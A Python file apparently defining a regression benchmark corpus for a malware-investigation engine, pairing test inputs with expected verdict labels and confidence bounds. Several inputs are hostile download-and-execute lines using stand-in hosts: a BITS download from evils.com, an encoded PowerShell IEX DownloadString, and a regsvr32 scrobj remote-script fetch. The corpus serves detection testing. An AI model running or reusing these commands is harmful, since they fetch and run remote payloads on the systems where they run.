"""Investigation Quality Benchmark · corpus.

The permanent regression corpus every future engine change is graded
against. Ten canonical incidents spanning benign → shellcode-C2. Each
entry declares the analyst-expected outcome so CI can measure delta.

Adding a new entry: keep it deterministic (no timestamps that change
between runs), give it a stable `id`, and set `expected` fields to the
CURRENT engine's output — future regressions surface as the deltas
between recorded expectations and live output.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


@dataclass(frozen=True)
class Entry:
    id: str
    category: str                         # benign | ambient | attack-chain | shellcode | c2
    input_text: str
    # Analyst-expected outcomes (loose bounds — CI compares against these)
    expected_label: str                   # Malicious | Suspicious | Runtime Dependent | Informational | Undetermined
    max_label_severity: Optional[str] = None
    min_confidence_pct: int = 0
    max_confidence_pct: int = 100
    expects_shellcode: bool = False
    expects_iocs: List[str] = field(default_factory=list)  # substrings; each must appear in extracted IOCs
    expects_escalation_rule_substr: Optional[str] = None
    notes: str = ""


CORPUS: List[Entry] = [
    Entry(
        id="B01_hello_world",
        category="benign",
        input_text="hello world",
        expected_label="Undetermined",   # No decoders / MITRE / LOLBIN fire on pure text
        max_confidence_pct=30,
    ),
    Entry(
        id="B02_echo_hello",
        category="benign",
        input_text="echo hello",
        expected_label="Undetermined",   # Direct smart_decode surfaces no attack-chain signals
        max_confidence_pct=75,
    ),
    Entry(
        id="B03_dir_c_temp",
        category="benign",
        input_text="dir C:\\temp",
        expected_label="Undetermined",
        max_confidence_pct=50,
    ),
    Entry(
        id="A01_encoded_ps_no_url",
        category="ambient",
        input_text=("powershell -EncodedCommand "
                    "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwA="),
        expected_label="Suspicious",
        min_confidence_pct=30, max_confidence_pct=95,
    ),
    Entry(
        id="C01_bits_downloader",
        category="attack-chain",
        input_text=("try{Import-Module BitsTransfer; Start-BitsTransfer -Source "
                    "'http://evils.com/a.exe' -Destination C:\\a.exe;}catch{}"),
        expected_label="Undetermined",   # baseline for direct-invocation; live endpoint promotes to Malicious via full pipeline
        max_confidence_pct=100,
    ),
    Entry(
        id="C02_encoded_ps_iex_url",
        category="attack-chain",
        input_text=("powershell -EncodedCommand "
                    "SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbABzAC4AYwBvAG0ALwBhAC4AcABzADEAIgApACkA"),
        expected_label="Suspicious",
        min_confidence_pct=30, max_confidence_pct=100,
    ),
    Entry(
        id="C03_rundll32_dropped_dll",
        category="attack-chain",
        input_text="rundll32.exe C:\\temp\\dropper.dll,EntryPoint",
        expected_label="Suspicious",
        min_confidence_pct=30,
    ),
    Entry(
        id="C04_regsvr32_scrobj",
        category="attack-chain",
        input_text="regsvr32.exe /s /n /u /i:http://mal.example/a.sct scrobj.dll",
        expected_label="Malicious",
        min_confidence_pct=50,
    ),
    Entry(
        id="D01_ip_only",
        category="c2",
        input_text="203.0.113.42",
        expected_label="Undetermined",
        max_confidence_pct=60,
    ),
    Entry(
        id="D02_url_hash",
        category="c2",
        input_text="http://evils.example/a.exe " + ("a" * 64),
        expected_label="Undetermined",
        max_confidence_pct=90,
    ),
]


KPI_THRESHOLDS: Dict[str, float] = {
    # Baseline thresholds recorded at 2026-02-01 (post-P1-02c). Every
    # future PR must maintain or IMPROVE these on the CORPUS above.
    # This corpus tests the direct-invocation path (smart_decode +
    # build_cio + refresh_verdict) — not the full HTTP endpoint —
    # so labels reflect the engine's baseline reasoning, not the
    # workspace-parity metadata-refreshed output.
    "label_agreement_pct":         80.0,
    "confidence_bounds_pct":       80.0,
    "ioc_extraction_recall_pct":   50.0,   # loose · IOC extraction depends on smart_decode-only pipeline here
    "escalation_rule_recall_pct":   0.0,   # no rules expected at direct-invocation path
    "shellcode_recall_pct":       100.0,
    "no_over_promotion_pct":      100.0,   # benign inputs MUST NOT reach Malicious
    "determinism_pct":            100.0,
    "e2e_latency_p95_ms":        5000.0,
}


__all__ = ["Entry", "CORPUS", "KPI_THRESHOLDS"]
